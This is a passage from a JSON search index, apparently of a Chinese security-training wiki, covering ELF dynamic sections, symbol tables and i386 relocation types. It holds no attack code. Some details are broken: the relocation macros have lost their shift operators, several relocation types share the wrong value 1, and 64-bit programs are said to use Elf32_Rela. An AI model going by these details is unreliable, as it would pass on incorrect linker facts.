\u5982\u679c\u6587\u4ef6\u4e2d\u4e0d\u5305\u542b\u6b64\u7c7b\u578b\u7684\u8868\u9879\uff0c\u5219\u8868\u793a\u6ca1\u6709\u4efb\u4f55\u91cd\u5b9a\u4f4d\u8868\u9879\u80fd\u591f\u9020\u6210\u5bf9\u4e0d\u53ef\u5199\u6bb5\u7684\u4fee\u6539\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u53ef\u80fd\u5b58\u5728\u82e5\u5e72\u91cd\u5b9a\u4f4d\u9879\u8bf7\u6c42\u5bf9\u4e0d\u53ef\u5199\u6bb5\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u505a\u76f8\u5e94\u7684\u51c6\u5907\u3002    DT_JMPREL  23  d_ptr  \u53ef\u9009  \u53ef\u9009  \u8be5\u7c7b\u578b\u7684\u6761\u76ee\u7684 d_ptr \u6210\u5458\u5305\u542b\u4e86\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\uff0c\u5e76\u4e14\u7d22\u5f15\u65f6\u5e94\u8be5\u4f1a\u628a\u8be5\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7c7b\u578b\u7684\u6307\u9488\u3002\u628a\u91cd\u5b9a\u4f4d\u8868\u9879\u5206\u5f00\u6709\u5229\u4e8e\u8ba9\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u65f6\u5ffd\u7565\u5b83\u4eec\uff08\u5f00\u542f\u4e86\u5ef6\u8fdf\u7ed1\u5b9a\uff09\u3002\u5982\u679c\u5b58\u5728\u6b64\u6210\u5458\uff0c\u76f8\u5173\u7684 DT_PLTRELSZ \u548c  DT_PLTREL \u5fc5\u987b\u4e5f\u5b58\u5728\u3002    DT_BIND_NOW  24  \u5ffd\u7565  \u53ef\u9009  \u53ef\u9009  \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5b58\u5728\u6b64\u7c7b\u578b\u7684\u8868\u9879\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9\u7a0b\u5e8f\u524d\uff0c\u5e94\u8be5\u5c06\u8be5\u6587\u4ef6\u7684\u6240\u6709\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u5730\u5740\u90fd\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u8fd9\u4e2a\u8868\u9879\u7684\u4f18\u5148\u6743\u9ad8\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6216\u8005dlopen(BA_LIB)\u6765\u8bbe\u7f6e\u3002    DT_LOPROC  ~DT_HIPROC  0x70000000 ~0x7fffffff  \u672a\u6307\u5b9a  \u672a\u6307\u5b9a  \u672a\u6307\u5b9a  \u8fd9\u4e2a\u8303\u56f4\u7684\u8868\u9879\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u7279\u5b9a\u7684\u8bed\u4e49\u7684\u3002     \u6ca1\u6709\u51fa\u73b0\u5728\u6b64\u8868\u4e2d\u7684\u6807\u8bb0\u503c\u662f\u4fdd\u7559\u7684\u3002\u6b64\u5916\uff0c\u9664\u4e86\u6570\u7ec4\u672b\u5c3e\u7684 DT_NULL \u5143\u7d20\u4ee5\u53ca DT_NEEDED \u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f\u7ea6\u675f\u4ee5\u5916\uff0c \u5176\u4ed6\u8868\u9879\u53ef\u4ee5\u4ee5\u4efb\u610f\u987a\u5e8f\u51fa\u73b0\u3002", 
            "title": ".dynamic"
        }, 
        {
            "location": "/executable/elf/elf_structure/#dynstr", 
            "text": "", 
            "title": ".dynstr"
        }, 
        {
            "location": "/executable/elf/elf_structure/#dynsym", 
            "text": "", 
            "title": ".dynsym"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_16", 
            "text": "\u52a8\u6001\u94fe\u63a5\u7684 ELF \u6587\u4ef6\u5177\u6709\u4e13\u95e8\u7684\u52a8\u6001\u7b26\u53f7\u8868\uff0c\u5176\u4f7f\u7528\u7684\u7ed3\u6784\u5c31\u662f Elf32_Sym\uff0c\u4f46\u662f\u5176\u5b58\u50a8\u7684\u8282\u4e3a .dynsym\u3002\u8fd9\u91cc\u518d\u6b21\u7ed9\u51fa Elf32_Sym \u7684\u7ed3\u6784  typedef struct\n{\n  Elf32_Word    st_name;   /* Symbol name (string tbl index) */\n  Elf32_Addr    st_value;  /* Symbol value */\n  Elf32_Word    st_size;   /* Symbol size */\n  unsigned char st_info;   /* Symbol type and binding */\n  unsigned char st_other;  /* Symbol visibility under glibc =2.2 */\n  Elf32_Section st_shndx;  /* Section index */\n} Elf32_Sym;  \u9700\u8981\u6ce8\u610f\u7684\u662f  .dynsym  \u662f\u8fd0\u884c\u65f6\u6240\u9700\u7684\uff0cELF \u6587\u4ef6\u4e2d export/import \u7684\u7b26\u53f7\u4fe1\u606f\u5168\u5728\u8fd9\u91cc\u3002\u4f46\u662f\uff0c .symtab  \u8282\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u662f\u7f16\u8bd1\u65f6\u7684\u7b26\u53f7\u4fe1\u606f\uff0c\u5b83\u4eec\u5728  strip  \u4e4b\u540e\u4f1a\u88ab\u5220\u9664\u6389\u3002  \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u52a8\u6001\u7b26\u53f7\u4e2d\u7684\u4e24\u4e2a\u6210\u5458   st_name\uff0c \u8be5\u6210\u5458\u4fdd\u5b58\u7740\u52a8\u6001\u7b26\u53f7\u5728 .dynstr \u8868\uff08\u52a8\u6001\u5b57\u7b26\u4e32\u8868\uff09\u4e2d\u7684\u504f\u79fb\u3002  st_value\uff0c\u5982\u679c\u8fd9\u4e2a\u7b26\u53f7\u88ab\u5bfc\u51fa\uff0c\u8fd9\u4e2a\u7b26\u53f7\u4fdd\u5b58\u7740\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_17", 
            "text": "\u52a8\u6001\u7b26\u53f7\u4e0e\u6307\u5411\u5b83\u7684 Elf_Verdef \u4fdd\u5b58\u5728 .gnu.version \u6bb5\u4e2d\uff0c\u5176\u4e2d\uff0c\u7531 Elf_Verneed \u7ed3\u6784\u4f53\u6784\u6210\u7684\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u5bf9\u5e94\u52a8\u6001\u7b26\u53f7\u8868\u7684\u4e00\u9879\u3002\u5176\u5b9e\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5c31\u53ea\u6709\u4e00\u4e2a\u57df\uff1a\u90a3\u5c31\u662f\u4e00\u4e2a16\u4f4d\u7684\u6574\u6570\uff0c\u8868\u793a gnu.verion_r \u6bb5\u4e2d\u7684\u4e0b\u6807\u3002  \u5728\u8fd9\u6837\u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f7f\u7528 Elf_Rel \u7ed3\u6784\u4f53\u6210\u5458 r_info \u4e2d\u7684\u4e0b\u6807\u540c\u65f6\u4f5c\u4e3a .dynsym \u6bb5\u548c gnu.version \u6bb5\u7684\u4e0b\u6807\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e00\u4e00\u5bf9\u5e94\u5230\u6bcf\u4e00\u4e2a\u7b26\u53f7\u5230\u5e95\u662f\u90a3\u4e2a\u7248\u672c\u7684\u4e86\u3002", 
            "title": "\u7b26\u53f7\u7248\u672c"
        }, 
        {
            "location": "/executable/elf/elf_structure/#relocation-related-sections", 
            "text": "\u94fe\u63a5\u5668\u5728\u5904\u7406\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u5bf9\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u67d0\u4e9b\u4f4d\u7f6e\u8fdb\u884c\u91cd\u5b9a\u4f4d\uff0c\u5373\u5c06\u7b26\u53f7\u6307\u5411\u6070\u5f53\u7684\u4f4d\u7f6e\uff0c\u786e\u4fdd\u7a0b\u5e8f\u6b63\u5e38\u6267\u884c\u3002\u4f8b\u5982\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u76f8\u5173\u7684\u8c03\u7528\u6307\u4ee4\u5fc5\u987b\u628a\u63a7\u5236\u6d41\u4ea4\u7ed9\u9002\u5f53\u7684\u76ee\u6807\u6267\u884c\u5730\u5740\u3002  \u5728 ELF \u6587\u4ef6\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 ELF \u8282\u90fd\u6709\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\uff0c\u6bd4\u5982\u8bf4 .text \u8282\u5982\u679c\u9700\u8981\u91cd\u5b9a\u4f4d\uff0c\u90a3\u4e48\u5176\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u4e3a .rel.text\u3002  \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u5bfc\u5165\u67d0\u4e2a\u51fd\u6570\u65f6\uff0c.dynstr \u5c31\u4f1a\u5305\u542b\u5bf9\u5e94\u51fd\u6570\u540d\u79f0\u7684\u5b57\u7b26\u4e32\uff0c.dynsym \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u5177\u6709\u76f8\u5e94\u540d\u79f0\u7684\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u7b26\u53f7\uff08Elf_Sym\uff09\uff0c\u5728 rel.dyn \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u6307\u5411\u8fd9\u4e2a\u7b26\u53f7\u7684\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002", 
            "title": "Relocation Related Sections"
        }, 
        {
            "location": "/executable/elf/elf_structure/#reladyn-relaplt", 
            "text": ".rel.dyn \u5305\u542b\u4e86\u52a8\u6001\u94fe\u63a5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u53d8\u91cf\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5728\u52a0\u8f7d\u7684\u65f6\u5019\u5fc5\u987b\u5b8c\u5168\u786e\u5b9a\u3002\u800c .rel.plt \u5305\u542b\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u51fd\u6570\u7684\u4fe1\u606f\u3002\u8fd9\u4e24\u7c7b\u91cd\u5b9a\u4f4d\u8282\u90fd\u4f7f\u7528\u5982\u4e0b\u7684\u7ed3\u6784  typedef struct {\n    Elf32_Addr        r_offset;\n    Elf32_Word       r_info;\n} Elf32_Rel;\n\ntypedef struct {\n    Elf32_Addr     r_offset;\n    Elf32_Word    r_info;\n    Elf32_Sword    r_addend;\n} Elf32_Rela;  Elf32_Rela \u7c7b\u578b\u7684\u8868\u9879\u5305\u542b\u660e\u786e\u7684\u8865\u9f50\u4fe1\u606f\u3002 Elf32_Rel \u7c7b\u578b\u7684\u8868\u9879\u5728\u5c06\u88ab\u4fee\u6539\u7684\u4f4d\u7f6e\u4fdd\u5b58\u9690\u5f0f\u7684\u8865\u9f50\u4fe1\u606f\u3002\u7531\u4e8e\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u539f\u56e0\uff0c\u8fd9\u4e24\u79cd\u5f62\u5f0f\u90fd\u5b58\u5728\uff0c\u751a\u81f3\u662f\u5fc5\u9700\u7684\u3002\u56e0\u6b64\uff0c\u5bf9\u7279\u5b9a\u673a\u5668\u7684\u5b9e\u73b0\u53ef\u4ee5\u4ec5\u4f7f\u7528\u4e00\u79cd\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e\u4e0a\u4e0b\u6587\u4f7f\u7528\u4e24\u79cd\u5f62\u5f0f\u3002  \u4e00\u822c\u6765\u8bf4\uff0c32 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rel\uff0c64 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rela\u3002  \u5176\u4e2d\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b     \u6210\u5458  \u8bf4\u660e      r_offset  \u6b64\u6210\u5458\u7ed9\u51fa\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u3002 \u5bf9\u4e8e\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u6b64\u503c\u662f\u4ece\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u6240\u5728\u8282\u533a\u5934\u90e8\u5f00\u59cb\u5230\u5c06\u88ab\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5b57\u8282\u504f\u79fb\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u800c\u8a00\uff0c\u5176\u53d6\u503c\u662f\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 \u865a\u62df\u5730\u5740 \uff0c\u4e00\u822c\u800c\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u6240\u8bf4\u7684 GOT \u8868\u7684\u5730\u5740\u3002    r_info  \u6b64\u6210\u5458\u7ed9\u51fa\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u3002   \u4f8b\u5982\u4e00\u4e2a\u8c03\u7528\u6307\u4ee4\u7684\u91cd\u5b9a\u4f4d\u9879\u5c06\u5305\u542b\u88ab\u8c03\u7528\u51fd\u6570\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002\u5982\u679c\u7d22\u5f15\u662f STN_UNDEF\uff0c\u90a3\u4e48\u91cd\u5b9a\u4f4d\u4f7f\u7528 0 \u4f5c\u4e3a\u201c\u7b26\u53f7\u503c\u201d\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u7c7b\u578b\u662f\u548c\u5904\u7406\u5668\u76f8\u5173\u7684\u3002    r_addend  \u6b64\u6210\u5458\u7ed9\u51fa\u4e00\u4e2a\u5e38\u91cf\u8865\u9f50\uff0c\u7528\u6765\u8ba1\u7b97\u5c06\u88ab\u586b\u5145\u5230\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u6570\u503c\u3002     \u5f53\u7a0b\u5e8f\u4ee3\u7801\u5f15\u7528\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u9879\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u6216\u8005\u7b26\u53f7\u8868\u7d22\u5f15\u65f6\uff0c\u8fd9\u4e2a\u7d22\u5f15\u662f\u5bf9\u8868\u9879\u7684 r_info \u6210\u5458\u5e94\u7528 ELF32_R_TYPE \u6216\u8005 ELF32_R_SYM \u7684\u7ed3\u679c\u3002 \u4e5f\u5c31\u662f\u8bf4 r_info \u7684\u9ad8\u4e09\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684\u503c\u8868\u793a\u8fd9\u4e2a\u52a8\u6001\u7b26\u53f7\u5728.dynsym\u7b26\u53f7\u8868\u4e2d\u7684\u4f4d\u7f6e\u3002  #define ELF32_R_SYM(i)    ((i) 8)  #define ELF32_R_TYPE(i)   ((unsigned char)(i))  #define ELF32_R_INFO(s,t) (((s) 8)+(unsigned char)(t))   \u91cd\u5b9a\u4f4d\u8282\u533a\u4f1a\u5f15\u7528\u4e24\u4e2a\u5176\u5b83\u8282\u533a\uff1a \u7b26\u53f7\u8868\u3001\u8981\u4fee\u6539\u7684\u8282\u533a \u3002\u8282\u533a\u5934\u90e8\u7684 sh_info \u548c sh_link \u6210\u5458\u7ed9\u51fa\u76f8\u5e94\u7684\u5173\u7cfb\u3002", 
            "title": ".rel(a).dyn &amp; .rel(a).plt"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_18", 
            "text": "\u91cd\u5b9a\u4f4d\u8868\u9879\u63cf\u8ff0\u4e86\u5982\u4f55\u4fee\u6539\u76f8\u5173\u7684\u6307\u4ee4\u4e0e\u6570\u636e\u57df\uff0c\u5176\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u5982\u4e0b   \u5176\u4e2d\uff0cword32 \u6307\u5b9a\u4e86\u4e00\u4e2a 32 \u6bd4\u7279\u7684\u53d8\u91cf\uff0c\u5360\u7528 4 \u4e2a\u5b57\u8282\uff0c\u5bf9\u9f50\u65b9\u5f0f\u4efb\u610f\u3002\u8fd9\u4e9b\u503c\u4f7f\u7528\u548c Intel \u67b6\u6784\u4e2d\u5176\u5b83\u5b57\u7c7b\u4f3c\u7684\u5b57\u8282\u5e8f\uff0c\u4e00\u822c\u90fd\u662f\u5c0f\u7aef\u5e8f\u3002   \u5728\u4e0b\u9762\u7684\u8ba1\u7b97\u4e2d\uff0c\u6211\u4eec\u5047\u8bbe\u662f\u628a\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u4ece\u6982\u5ff5\u4e0a\u8bb2\uff0c\u94fe\u63a5\u5668\u4f1a\u628a\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5408\u5e76\u8d77\u6765\u5f97\u5230\u8f93\u51fa\u6587\u4ef6\u3002\u5b83\u9996\u5148\u8981\u51b3\u5b9a\u5982\u4f55\u7ed3\u5408\u5e76\u653e\u7f6e\u8fd9\u4e9b\u8f93\u5165\u6587\u4ef6\uff0c\u7136\u540e\u66f4\u65b0\u7b26\u53f7\u8868\u7684\u503c\uff0c\u6700\u540e\u624d\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u91cd\u5b9a\u4f4d\u65b9\u6cd5\u662f\u76f8\u4f3c\u7684\uff0c\u5e76\u4e14\u7ed3\u679c\u51e0\u4e4e\u4e00\u6837\u3002\u5728\u540e\u9762\u7684\u63cf\u8ff0\u4e2d\u6211\u4eec\u5c06\u4f1a\u91c7\u7528\u5982\u4e0b\u8bb0\u53f7\u3002   A(addend) \u7528\u6765\u8ba1\u7b97\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u53d6\u503c\u7684\u8865\u9f50\u3002  B(base)  \u8868\u793a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u865a\u62df\u57fa\u5730\u5740\u4e3a0\uff0c\u4f46\u662f\u5728\u6267\u884c\u65f6\uff0c\u5176\u5730\u5740\u5374\u4f1a\u53d1\u751f\u6539\u53d8\u3002  G(Global) \u8868\u793a\u5728\u6267\u884c\u65f6\u91cd\u5b9a\u4f4d\u9879\u7684\u7b26\u53f7\u5728\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u504f\u79fb\u3002  GOT (global offset table) \u8868\u793a\u5168\u5c40\u504f\u79fb\u8868\uff08GOT\uff09\u7684\u5730\u5740\u3002  L (linkage) \u8868\u793a\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4e2d\u4e00\u4e2a\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4f1a\u628a\u51fd\u6570\u8c03\u7528\u91cd\u5b9a\u4f4d\u5230\u6b63\u786e\u7684\u76ee\u6807\u4f4d\u7f6e\u3002\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u6784\u9020\u521d\u59cb\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u7136\u540e\u52a8\u6001\u94fe\u63a5\u5668\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u4fee\u6539\u8fd9\u4e9b\u9879\u76ee\u3002  P (place) \u8868\u793a\u88ab\u91cd\u5b9a\u4f4d\uff08\u7528 r_offset \u8ba1\u7b97\uff09\u7684\u5b58\u50a8\u5355\u5143\u7684\u4f4d\u7f6e\uff08\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\uff09\u3002  S  (symbol) \u8868\u793a\u7d22\u5f15\u4f4d\u4e8e\u91cd\u5b9a\u4f4d\u9879\u4e2d\u7684\u7b26\u53f7\u7684\u53d6\u503c\u3002   \u91cd\u5b9a\u4f4d\u9879\u7684 r_offset \u53d6\u503c\u4e3a\u53d7\u5f71\u54cd\u7684\u5b58\u50a8\u5355\u5143\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u6216\u8005\u865a\u62df\u5730\u5740\u3002\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7ed9\u51fa\u9700\u8981\u4fee\u6539\u7684\u6bd4\u7279\u4f4d\u4ee5\u53ca\u5982\u4f55\u8ba1\u7b97\u5b83\u4eec\u7684\u503c\u3002\u5176\u4e2d\uff0cIntel \u67b6\u6784\u53ea\u4f7f\u7528 ELF32_REL \u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5c06\u8981\u88ab\u91cd\u5b9a\u4f4d\u7684\u6210\u5458\u4fdd\u7559\u5bf9\u5e94\u7684\u8865\u9f50\u6570\u503c\u3002\u5728\u6240\u6709\u7684\u60c5\u51b5\u4e0b\uff0c\u8865\u9f50\u7684\u6570\u503c\u4e0e\u8ba1\u7b97\u7684\u7ed3\u679c\u4f7f\u7528\u76f8\u540c\u7684\u5b57\u8282\u5e8f\u3002  \u91cd\u5b9a\u4f4d\u7c7b\u578b\u4ee5\u53ca\u90e8\u5206\u542b\u4e49\u5982\u4e0b     \u540d\u79f0  \u503c  \u57df  \u8ba1\u7b97  \u542b\u4e49      R_386_NONE  0  \u65e0  \u65e0     R_386_32  1  word32  S + A     R_386_PC32  1  word32  S + A - P     R_386_GOT32  1  word32  G + A - P  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u4ece\u5168\u5c40\u504f\u79fb\u8868\u57fa\u5740\u5230\u7b26\u53f7\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u7684\u8ddd\u79bb\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002    R_386_PLT32  1  word32  L + A - P  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5730\u5740\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002    R_386_COPY  5  \u65e0  \u65e0  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u6307\u5411\u53ef\u5199\u6bb5\u4e2d\u7684\u4f4d\u7f6e\u3002\u7b26\u53f7\u8868\u89c4\u5b9a\u8fd9\u79cd\u7b26\u53f7\u5e94\u65e2\u5b58\u5728\u4e8e\u5f53\u524d\u76ee\u6807\u6587\u4ef6\u53c8\u8be5\u5b58\u5728\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4e0e\u8be5\u5171\u4eab\u76ee\u6807\u7b26\u53f7\u76f8\u5173\u7684\u6570\u636e\u590d\u5236\u5230\u7531\u4e0a\u8ff0\u504f\u79fb\u91cf\u6307\u5b9a\u7684\u4f4d\u7f6e\u3002    R_386_GLOB_DAT  6  word32  S  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7528\u4e8e\u628a\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u7b26\u53f7\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7b26\u53f7\u7684\u5730\u5740\u3002\u8fd9\u4e2a\u7279\u6b8a\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u5141\u8bb8\u786e\u5b9a\u7b26\u53f7\u548c\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e4b\u95f4\u7684\u5173\u7cfb\u3002    R_386_JMP_SLOT  7  word32  S  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u76f8\u5e94\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4fee\u6539\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u4ece\u800c\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e0a\u8ff0\u6307\u51fa\u7684\u7b26\u53f7\u5730\u5740\u3002    R_386_RELATIVE  8  word32  B + A  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u4e2d\u7684\u4e00\u4e2a\u5305\u542b\u4e86\u67d0\u4e2a\u4ee3\u8868\u76f8\u5bf9\u5730\u5740\u7684\u503c\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u901a\u8fc7\u628a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88c5\u8f7d\u5230\u7684\u865a\u62df\u5730\u5740\u4e0e\u4e0a\u8ff0\u76f8\u5bf9\u5730\u5740\u76f8\u52a0\u6765\u8ba1\u7b97\u5bf9\u5e94\u865a\u62df\u5730\u5740\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u9879\u8bbe\u7f6e\u7b26\u53f7\u8868\u7d22\u5f15\u4e3a0\u3002    R_386_GOTOFF  9  word32  S + A - GOT  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u503c\u4e0e\u5168\u5c40\u504f\u79fb\u8868\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u901a\u77e5\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002    R_386_GOTPC  10  word32  S + A - P  \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u4e0e R_386_PC32  \u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5728\u8ba1\u7b97\u65f6\u4f7f\u7528\u5168\u5c40\u504f\u79fb\u8868\u7684\u5730\u5740\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8be5\u91cd\u5b9a\u4f4d\u8868\u9879\u4e2d\u88ab\u5f15\u7528\u7684\u7b26\u53f7\u662f _GLOBAL_OFFSET_TABLE_  \uff0c\u5b83\u4f1a\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002", 
            "title": "\u91cd\u5b9a\u4f4d\u7c7b\u578b"
        }, 
        {
            "location": "/executable/elf/elf_structure/#global-offset-table", 
